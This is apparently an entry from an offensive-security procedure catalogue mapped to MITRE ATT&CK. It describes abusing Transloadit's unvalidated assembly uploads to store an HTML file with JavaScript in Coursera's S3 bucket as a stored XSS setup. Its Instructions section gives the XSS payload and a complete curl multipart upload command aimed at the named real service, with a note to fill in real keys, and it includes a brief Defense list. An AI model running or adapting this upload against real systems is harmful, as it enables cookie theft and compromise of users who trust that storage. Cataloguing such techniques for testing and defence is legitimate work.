---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - file-upload
  - transloadit
  - xss
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/transloadit-upload-malicious-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T03:16:02.944Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Upload-Malicious-HTML-to-Transloadit-Assembly

## Summary

This procedure exploits the lack of file type validation in Transloadit's assembly endpoint to upload an HTML file containing JavaScript, which is then processed and stored in Coursera's S3 bucket, setting up a stored XSS attack.

## Description

Transloadit allows unauthenticated uploads to its assemblies endpoint without restricting file types, enabling attackers to submit HTML files with embedded JavaScript. The service processes the file using a template and forwards it to the client's S3 bucket (in this case, Coursera's). This bypasses typical image upload restrictions and allows malicious content to be stored in a trusted location for later retrieval and execution.

## Requirements

1. Access to public internet and HTTP client (e.g., curl)
2. Valid Transloadit auth key and template_id (e.g., from Coursera's integration)
3. Assembly hash (generated or known from prior reconnaissance)

## Defense

Defensive measures and detection strategies:

- Implement strict file type whitelisting (e.g., only images) on upload processors like Transloadit
- Validate content-type and scan uploads for executable code before storage
- Monitor S3 bucket for anomalous file types (e.g., .html in image directories)

## Objectives

1. Store malicious executable content in trusted storage
2. Prepare for downstream XSS execution
3. Achieve persistence without authentication

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Create an HTML file with XSS payload to alert document cookies, simulating data theft.

No command needed; save as 'stored_xss.html':

```html
<html><script>alert(document.cookie);</script></html>
```

### Step 2: Execute Upload

**Context**: Send multipart POST to Transloadit's endpoint with params and file.

**Command** ([[commands/transloadit-upload-malicious-file]]):

```bash
curl -X POST "https://isadora.transloadit.com/assemblies/[hash]?redirect=false" \
  -H "Content-Type: multipart/form-data; boundary=---------------------------185739484714145007371896001880" \
  -H "Referer: https://api.coursera.org/account/profile" \
  --data-binary @- << EOF
-----------------------------185739484714145007371896001880
Content-Disposition: form-data; name="params"

{"max_size":1048576,"auth":{"key":"[hash2]"},"template_id":"[hash3]"}
-----------------------------185739484714145007371896001880
Content-Disposition: form-data; name="my_file"; filename="stored_xss.html"
Content-Type: text/html

<html><script>alert(document.cookie);</script></html>
-----------------------------185739484714145007371896001880--
EOF
```

> This command uploads the file; expect a JSON response with assembly OK and ID for polling. Replace placeholders with real values.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques

-

## Commands Used

- [[commands/transloadit-upload-malicious-file]]

## Tools Used

-

## Tags

- file-upload
- transloadit
- xss
